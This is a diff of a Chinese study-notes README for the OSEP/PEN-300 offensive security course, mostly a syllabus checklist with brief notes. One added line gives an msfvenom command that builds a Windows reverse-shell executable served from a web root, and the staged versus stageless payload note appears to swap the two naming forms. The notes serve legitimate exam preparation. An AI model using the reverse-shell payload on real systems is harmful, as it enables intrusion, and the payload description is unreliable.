@@ -1,11 +1,9 @@
 # OSEP_PEN300
-
 被大佬忽悠报了名，2021给自己一点压力，由于是新课程，资料实在太少，开个荒。
 感谢thanks delethead 提供的syllabus
 https://github.com/deletehead/pen_300_osep_prep 
 
 ## Course Progress
-
 - [ ] Videos
 - [ ] Read course content
 - [ ] Complete all exercises
@@ -13,129 +11,87 @@ https://github.com/deletehead/pen_300_osep_prep
 - [ ] Complete labs
 
 ## Syllabus
+### 1. Evasion Techniques and Breaching Defenses: General Course Information
 
-- [x] 1. Evasion Techniques and Breaching Defenses: General Course Information
+  	OSEP课程主要介绍绕过防御的技巧，建议考过OSCP的同学报考。
+#### 1.1 About The PEN-300 Course
+  	免杀，横向，域渗透，客户端代码执行。
+#### 1.2 Provided Material
+  	同oscp，教材，视频，lab，考试机会。
+  	lab结束后最晚120天内报名考试。
+#### 1.3 Overall Strategies for Approaching the Course
+  	无他，try harder。
+  	课程习题做完不加分。
+#### 1.4 About the PEN-300 VPN Lab
+  	基本都是新机器，win10,server 2019,ubuntu 20.04
+#### 1.5 About the OSEP Exam
+  	考试时间一共47小时45分，再加24小时写报告。
+  	考试通过是获取特殊网段权限或取得100分的单个机器。
+  	估计就是拿下所有外网机器或者通过外网机器进入内网横向最后拿到域管理员权限。
+#### 1.6 Wrapping Up
 
-  OSEP课程主要介绍绕过防御的技巧，建议考过OSCP的同学报考。
-
-  - [x] 1.1 About The PEN-300 Course
-
-    免杀，横向，域渗透，客户端代码执行。
-
-  - [x] 1.2 Provided Material
-
-    同oscp，教材，视频，lab，考试机会。
-
-    lab结束后最晚120天内报名考试。
-
-  - [x] 1.3 Overall Strategies for Approaching the Course
-
-    无他，try harder。
-    课程习题做完不加分。
-
-  - [x] 1.4 About the PEN-300 VPN Lab
-
-    基本都是新机器，win10,server 2019,ubuntu 20.04
-
-  - [x] 1.5 About the OSEP Exam
-
-    考试时间一共47小时45分，再加24小时写报告。
-
-    考试通过是获取特殊网段权限或取得100分的单个机器。
-
-    估计就是拿下所有外网机器或者通过外网机器进入内网横向最后拿到域管理员权限。
-
-  - [x] 1.6 Wrapping Up
-
-- [x] 2. Operating System and Programming Theory
-
-  - [x] 2.1 Programming Theory
-
-    - [x] 2.1.1 Programming Language Level
-
-      CPU架构目前有两种，windows和linux操作系统基本是x86架构，手机和平板基本是ARM架构。
-
-      机器语言：CPU使用操作码（opcode）进行运算。
-
-      汇编语言：一系列操作码组成汇编语言。
-
-      高级语言：
-
-      面对对象语言：JAVA需要在虚拟机（JVM）中编译成字节码（bytecode）运行时虚拟机会将字节码编译成操作码（opcode）通过cpu进行运算。虚拟机会对运行内存进行保护。
-
-    - [x] 2.1.2 Programming Concepts
-
-  - [ ] 2.2 Windows Concepts
-
-    - [ ] 2.2.1 Windows on Windows
-
-      WOW64: 让64位windows操作系统执行32位程序。
-
-      对32位windows操作系统，原生32位windows程序存储在C:\Windows\System32。
-
-      对64位windows操作系统，原生64位windows程序存储在C:\Windows\System32，32位版本存储在C:\Windows\SysWOW64。
-
-    - [ ] 2.2.2 Win32 APIs
-
-    - [ ] 2.2.3 Windows Registry
-
-  - [ ] 2.3 Wrapping Up
-
-- [ ] 3. Client Side Execution With Office
-
-  - [ ] 3.1 Will You Be My Dropper
-
-    - [ ] 3.1.1 Staged vs. Non-Staged Payloads
-
-      msfvenom中使用_的 windows/meterpreter/reverse_tcp 为 Non-staged payloads 无状态，体积较大，
-
-      msfvenom中使用/的为 windows/meterpreter_reverse_tcp 为staged payloads 状态payload，体积比较小
-
-      
-
-      参考：https://blog.rapid7.com/2015/03/25/stageless-meterpreter-payloads/
-
-      https://buffered.io/posts/staged-vs-stageless-handlers/
-
-    - [ ] 3.1.2 Building Our Droppers
-
-      - [ ] 3.1.2.1 Exercise
+### 2. Operating System and Programming Theory
+#### 2.1 Programming Theory
+##### 2.1.1 Programming Language Level
+  	CPU架构目前有两种，windows和linux操作系统基本是x86架构，手机和平板基本是ARM架构。
+  	机器语言：CPU使用操作码（opcode）进行运算。
+  	汇编语言：一系列操作码组成汇编语言。
+  	高级语言：
+  	面对对象语言：JAVA需要在虚拟机（JVM）中编译成字节码（bytecode）运行时虚拟机会将字节码编译成操作码（opcode）通过cpu进行运算。虚拟机会对运行内存进行保护。
+#####  2.1.2 Programming Concepts
+####  2.2 Windows Concepts
+#####  2.2.1 Windows on Windows
+  	WOW64: 让64位windows操作系统执行32位程序。
+  	对32位windows操作系统，原生32位windows程序存储在C:\Windows\System32。
+  	对64位windows操作系统，原生64位windows程序存储在C:\Windows\System32，32位版本存储在C:\Windows\SysWOW64。
+#####  2.2.2 Win32 APIs
+#####  2.2.3 Windows Registry
+#### 2.3 Wrapping Up
+### 3. Client Side Execution With Office
+#### 3.1 Will You Be My Dropper
+#####  3.1.1 Staged vs. Non-Staged Payloads
+  	msfvenom中使用_的 windows/meterpreter/reverse_tcp 为 Non-staged payloads 无状态，体积较大
+  	msfvenom中使用/的为 windows/meterpreter_reverse_tcp 为staged payloads 状态payload，体积比较小
+  	参考：https://blog.rapid7.com/2015/03/25/stageless-meterpreter-payloads/
+  	https://buffered.io/posts/staged-vs-stageless-handlers/
+##### 3.1.2 Building Our Droppers
+  	msfvenom -p windows/shell_reverse_tcp LHost=192.168.119.120 LPort=4444 -f exe -o /var/www/html/shell.exe
+######  3.1.2.1 Exercise
 
     - [ ] 3.1.3 HTML Smuggling
+      
+      ```<html>
+      <html>
+      	
+      ```
 
-      - [ ] 3.1.3.1 Exercises
 
+​      
+​      
+​      - [ ] 3.1.3.1 Exercises
   - [ ] 3.2 Phishing With Microsoft Office
-
     - [ ] 3.2.1 Installing Microsoft Office
       - [ ] 3.2.1.1 Exercise
     - [ ] 3.2.2 Introduction to VBA
       - [ ] 3.2.2.1 Exercises
     - [ ] 3.2.3 Let PowerShell Help Us
       - [ ] 3.2.3.1 Exercises
-
   - [ ] 3.3 Keeping Up Appearances
-
+    
     - [ ] 3.3.1 Phishing PreTexting
     - [ ] 3.3.2 The Old Switcheroo
       - [ ] 3.3.2.1 Exercises
-
   - [ ] 3.4 Executing Shellcode in Word Memory
-
     - [ ] 3.4.1 Calling Win32 APIs from VBA
       - [ ] 3.4.1.1 Exercises
     - [ ] 3.4.2 VBA Shellcode Runner
       - [ ] 3.4.2.1 Exercise
-
   - [ ] 3.5 PowerShell Shellcode Runner
-
     - [ ] 3.5.1 Calling Win32 APIs from PowerShell
       - [ ] 3.5.1.1 Exercises
     - [ ] 3.5.2 Porting Shellcode Runner to PowerShell
       - [ ] 3.5.2.1 Exercises
-
   - [ ] 3.6 Keep That PowerShell in Memory
-
     - [ ] 3.6.1 Add-Type Compilation
       - [ ] 3.6.1.1 Exercises
     - [ ] 3.6.2 Leveraging UnsafeNativeMethods
@@ -144,20 +100,15 @@ https://github.com/deletehead/pen_300_osep_prep
       - [ ] 3.6.3.1 Exercises
     - [ ] 3.6.4 Reflection Shellcode Runner in PowerShell
       - [ ] 3.6.4.1 Exercises
-
   - [ ] 3.7 Talking To The Proxy
-
     - [ ] 3.7.1 PowerShell Proxy-Aware Communication
       - [ ] 3.7.1.1 Exercises
     - [ ] 3.7.2 Fiddling With The User-Agent
       - [ ] 3.7.2.1 Exercises
     - [ ] 3.7.3 Give Me A SYSTEM Proxy
       - [ ] 3.7.3.1 Exercise
-
   - [ ] 3.8 Wrapping Up
-
 - [ ] 4. Client Side Code Execution With Windows Script Host
-
   - [ ] 4.1 Creating a Basic Dropper in Jscript
     - [ ] 4.1.1 Execution of Jscript on Windows
       - [ ] 4.1.1.1 Exercises
@@ -181,11 +132,8 @@ https://github.com/deletehead/pen_300_osep_prep
     - [ ] 4.3.1 Reflective Load
       - [ ] 4.3.1.1 Exercises
   - [ ] 4.4 Wrapping Up
-
 - [ ] 5. Process Injection and Migration
-
   - [ ] 5.1 Finding a Home for Our Shellcode
-
     - [ ] 5.1.1 Process Injection and Migration Theory
     - [ ] 5.1.2 Process Injection in C#
       - [ ] 5.1.2.1 Exercises
@@ -203,13 +151,11 @@ https://github.com/deletehead/pen_300_osep_prep
       - [ ] 5.4.2 Process Hollowing in C#
         - [ ] 5.4.2.1 Exercises
     - [ ] 5.5 Wrapping Up
-
   - [ ] 6. Introduction to Antivirus Evasion
-
     - [ ] 6.1 Antivirus Software Overview
     - [ ] 6.2 Simulating the Target Environment
     - [ ] 6.3 Locating Signatures in Files
-      - [ ] 6.3.1.1 Exercise
+        - [ ] 6.3.1.1 Exercise
     - [ ] 6.4 Bypassing Antivirus with Metasploit
       - [ ] 6.4.1 Metasploit Encoders
         - [ ] 6.4.1.1 Exercise
@@ -239,9 +185,7 @@ https://github.com/deletehead/pen_300_osep_prep
         - [ ] 6.8.3.1 Exercises
         - [ ] 6.8.3.2 Extra Mile Exercise
     - [ ] 6.9 Wrapping Up
-
   - [ ] 7. Advanced Antivirus Evasion
-
     - [ ] 7.1 Intel Architecture and Windows 10
       - [ ] 7.1.1 WinDbg Introduction
         - [ ] 7.1.1.1 Exercises
@@ -273,9 +217,7 @@ https://github.com/deletehead/pen_300_osep_prep
       - [ ] 7.6.3 I Am My Own Executable
         - [ ] 7.6.3.1 Exercises
     - [ ] 7.7 Wrapping Up
-
 - [ ] 8. Application Whitelisting
-
   - [ ] 8.1 Application Whitelisting Theory and Setup
     - [ ] 8.1.1 Application Whitelisting Theory
     - [ ] 8.1.2 AppLocker Setup and Rules
@@ -317,9 +259,7 @@ https://github.com/deletehead/pen_300_osep_prep
       - [ ] 8.5.2.1 Exercises
       - [ ] 8.5.2.2 Extra Mile
   - [ ] 8.6 Wrapping Up
-
 - [ ] 9 Bypassing Network Filters
-
   - [ ] 9.1 DNS Filters
     - [ ] 9.1.1 DNS Filters
       - [ ] 9.1.1.1 Exercises
@@ -345,9 +285,7 @@ https://github.com/deletehead/pen_300_osep_prep
     - [ ] 9.7.2 DNS Tunneling with dnscat2
       - [ ] 9.7.2.1 Exercises
   - [ ] 9.8 Wrapping Up
-
 - [ ] 10 Linux Post-Exploitation
-
   - [ ] 10.1 User Configuration Files
     - [ ] 10.1.1 VIM Config Simple Backdoor
       - [ ] 10.1.1.1 Exercises
@@ -367,9 +305,7 @@ https://github.com/deletehead/pen_300_osep_prep
     - [ ] 10.3.3 Exploitation via LD_PRELOAD
       - [ ] 10.3.3.1 Exercises
   - [ ] 10.4 Wrapping Up
-
 - [ ] 11 Kiosk Breakouts
-
   - [ ] 11.1 Kiosk Enumeration
     - [ ] 11.1.1 Kiosk Browser Enumeration
       - [ ] 11.1.1.1 Exercises
@@ -393,9 +329,7 @@ https://github.com/deletehead/pen_300_osep_prep
     - [ ] 11.5.1 Windows Kiosk Breakout Techniques
       - [ ] 11.5.1.1 Exercises
   - [ ] 11.6 Wrapping Up
-
 - [ ] 12 Windows Credentials
-
   - [ ] 12.1 Local Windows Credentials
     - [ ] 12.1.1 SAM Database
       - [ ] 12.1.1.1 Exercises
@@ -418,9 +352,7 @@ https://github.com/deletehead/pen_300_osep_prep
     - [ ] 12.4.2 MiniDumpWriteDump
       - [ ] 12.4.2.1 Exercises
   - [ ] 12.5 Wrapping Up
-
 - [ ] 13 Windows Lateral Movement
-
   - [ ] 13.1 Remote Desktop Protocol
     - [ ] 13.1.1 Lateral Movement with RDP
       - [ ] 13.1.1.1 Exercises
@@ -437,9 +369,7 @@ https://github.com/deletehead/pen_300_osep_prep
     - [ ] 13.2.2 Implementing Fileless Lateral Movement in C#
       - [ ] 13.2.2.1 Exercises
   - [ ] 13.3 Wrapping Up
-
 - [ ] 14 Linux Lateral Movement
-
   - [ ] 14.1 Lateral Movement with SSH
     - [ ] 14.1.1 SSH Keys
     - [ ] 14.1.2 SSH Persistence
@@ -471,9 +401,7 @@ https://github.com/deletehead/pen_300_osep_prep
       - [ ] 14.3.4.1 Exercises
       - [ ] 14.3.4.2 Extra Mile
   - [ ] 14.4 Wrapping Up
-
 - [ ] 15 Microsoft SQL Attacks
-
   - [ ] 15.1 MS SQL in Active Directory
     - [ ] 15.1.1 MS SQL Enumeration
       - [ ] 15.1.1.1 Exercise
@@ -498,9 +426,7 @@ https://github.com/deletehead/pen_300_osep_prep
       - [ ] 15.3.2.1 Exercises
       - [ ] 15.3.2.2 Extra Mile
   - [ ] 15.4 Wrapping Up
-
 - [ ] 16 Active Directory Exploitation
-
   - [ ] 16.1 AD Object Security Permissions
     - [ ] 16.1.1 Object Permission Theory
       - [ ] 16.1.1.1 Exercises
@@ -539,9 +465,7 @@ https://github.com/deletehead/pen_300_osep_prep
       - [ ] 16.6.2.1 Exercises
       - [ ] 16.6.2.2 Extra Mile
   - [ ] 16.7 Wrapping Up
-
 - [ ] 17 Combining the Pieces
-
   - [ ] 17.1 Enumeration and Shell
     - [ ] 17.1.1 Initial Enumeration
       - [ ] 17.1.1.1 Exercises
@@ -563,8 +487,6 @@ https://github.com/deletehead/pen_300_osep_prep
       - [ ] 17.3.2.1 Exercises
       - [ ] 17.3.2.2 Extra Mile
   - [ ] 17.4 Wrapping Up
-
 - [ ] 18 Trying Harder: The Labs
-
   - [ ] 18.1 Real Life Simulations
   - [ ] 18.2 Wrapping Up
